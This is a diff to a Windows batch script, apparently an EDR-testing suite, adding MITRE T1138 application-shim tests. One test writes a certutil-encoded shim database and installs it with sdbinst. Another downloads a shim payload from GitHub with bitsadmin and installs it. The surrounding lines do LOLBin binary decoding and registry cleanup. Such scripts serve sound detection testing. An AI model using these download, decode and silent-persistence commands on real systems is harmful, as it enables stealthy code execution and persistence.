@@ -325,6 +325,54 @@ echo Command Excuted: C:\windows\system32\setsh.bac C:\windows\system32\setsh.ex
 
 timeout 5
 
+echo %time% %date% [+] T1138 - App Shim installation for Calc.exe via file decode
+echo -----BEGIN CERTIFICATE----- > shim.64
+echo AgAAAAEAAABzZGJmAnjeAAAAA3ggAAAAAjgHcAM4AWAWQAEAAAABmAwAAABFWEUu >> shim.64
+echo Q0xBQ1IBAAADeA4AAAACOAdwAzgLYAGYAAAAAAN4DgAAAAI4B3ADOCBgAZgAAAAA >> shim.64
+echo A3gOAAAAAjgEcAM4AWABmAAAAAADeA4AAAACOA1wAzgVQAGYAAAAAAN4FAAAAAI4 >> shim.64
+echo EHADOAFgFkABAAAAAZgAAAAAA3gOAAAAAjgScAM4BpABmAAAAAADeBQAAAACOBJw >> shim.64
+echo AzgEkBZAAQAAAAGYAAAAAAN4GgAAAAI4B3ADOASQAZgMAAAAKrpBuRQxAq9SAQAA >> shim.64
+echo AXDgAAAAAVAJOgQMVR/UASJgBgAAAAFgHAAAACNAAQAAAAeQEAAAAO/VHM+BZc5A >> shim.64
+echo oCyA7S3ObrkCcAAAAAALcB4AAAABYHAAAAAJcAYAAAABYIAAAAAJcAYAAAABYLoA >> shim.64
+echo AAAHcH4AAAABYNgAAAAGYHAAAAAFYPAAAAAEkBAAAACpg6GdMzlyTIM54CQnCHDj >> shim.64
+echo CHAyAAAAAWAKAQAACWAUAQAAEGBGAQAAEWCWAQAAAlBqRLEdAQAGAANQakSxHQEA >> shim.64
+echo BgATYLoBAAAJcAwAAAABYLoAAAAIYNgAAAALcAYAAAABYBICAAABeCQCAAABiBAA >> shim.64
+echo AAAyAC4AMQAuADAALgAzAAAAAYhOAAAAewBjAGYAMQBjAGQANQBlAGYALQA2ADUA >> shim.64
+echo OAAxAC0ANAAwAGMAZQAtAGEAMAAyAGMALQA4ADAAZQBkADIAZABjAGUANgBlAGIA >> shim.64
+echo OQB9AAAAAYgKAAAAYwBhAGwAYwAAAAGINAAAAEEAZABkAFAAcgBvAGMAZQBzAHMA >> shim.64
+echo UABhAHIAYQBtAGUAdABlAHIAcwBGAGwAYQBnAHMAAAABiBgAAABSAGUAZABpAHIA >> shim.64
+echo ZQBjAHQARQBYAEUAAAABiBIAAABjAGEAbABjAC4AZQB4AGUAAAABiBQAAABNAGkA >> shim.64
+echo YwByAG8AcwBvAGYAdAAAAAGIBAAAACoAAAABiCwAAABNAGkAYwByAG8AcwBvAGYA >> shim.64
+echo dAAgAEMAbwByAHAAbwByAGEAdABpAG8AbgAAAAGISgAAAE0AaQBjAHIAbwBzAG8A >> shim.64
+echo ZgB0AK4AIABXAGkAbgBkAG8AdwBzAK4AIABPAHAAZQByAGEAdABpAG4AZwAgAFMA >> shim.64
+echo eQBzAHQAZQBtAAAAAYgeAAAANgAuADEALgA3ADYAMAAxAC4AMgAzADQAMAAzAAAA >> shim.64
+echo AYhSAAAANgAuADEALgA3ADYAMAAxAC4AMgAzADQAMAAzACAAKAB3AGkAbgA3AHMA >> shim.64
+echo cAAxAF8AbABkAHIALgAxADYAMAAzADIANQAtADAANgAwADAAKQAAAAGIEgAAAFYA >> shim.64
+echo aQBzAHQAYQBTAFAAMQAAAA== >> shim.64
+echo -----END CERTIFICATE----- >> shim.64
+start "" cmd /c certutil -f -decode shim.64 calc.sdb >nul
+start "" cmd /c sdbinst /q calc.sdb
+timeout 2
+start "" cmd /c sdbinst -u calc.sdb
+echo Execution Finished at %time% %date% 
+echo Command Excuted: certutil -f -decode shim.64 calc.sdb
+echo Command Excuted: sdbinst -q calc.sdb
+echo Command Excuted: sdbinst -u calc.sdb
+
+timeout 5
+
+echo %time% %date% [+] T1138 - App Shim installation for Calc.exe via file download
+
+start "" cmd /c bitsadmin.exe /transfer "JobName" https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/calc-exec.sdb "%cd%\calc2.sdb"
+start "" cmd /c sdbinst /q calc2.sdb
+timeout 2
+start "" cmd /c sdbinst -u calc2.sdb
+echo Execution Finished at %time% %date% 
+echo Command Excuted: sdbinst -q calc2.sdb
+echo Command Excuted: sdbinst -u calc2.sdb
+
+timeout 5
+
 
 echo **********************************************
 echo *      Testing LOLBAS PAYLOADS               *
@@ -404,6 +452,7 @@ echo Execution Finished at %time% %date%
 echo Command Excuted: [InternetShortcut] > C:\windows\temp\url.url
 echo Command Excuted: URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
 echo Command Excuted: rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
+
 timeout 5
 
 echo %time% %date% [+] Testing csc exec
@@ -666,7 +715,6 @@ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b6
 echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
 echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= >> pass.b64
 echo -----END CERTIFICATE----- >> pass.b64
-
 start "" cmd /c certutil -f -decode pass.b64 pass_TestBin.exe >nul
 start "" cmd /c WseClientSvc.exe pass_TestBin.exe calc.exe
 echo Execution Finished at %time% %date%
@@ -866,6 +914,8 @@ start "" cmd /c del testADS.txt
 start "" cmd /c del C:\windows\temp\url.url
 start "" cmd /c del Default_File_Path2.ps1
 start "" cmd /c del notepad.msi
+start "" cmd /c del shim.64
+start "" cmd /c del calc2.sdb
 start "" cmd /c reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /f
 start "" cmd /c reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /f
 start "" cmd /c sc delete evilservice
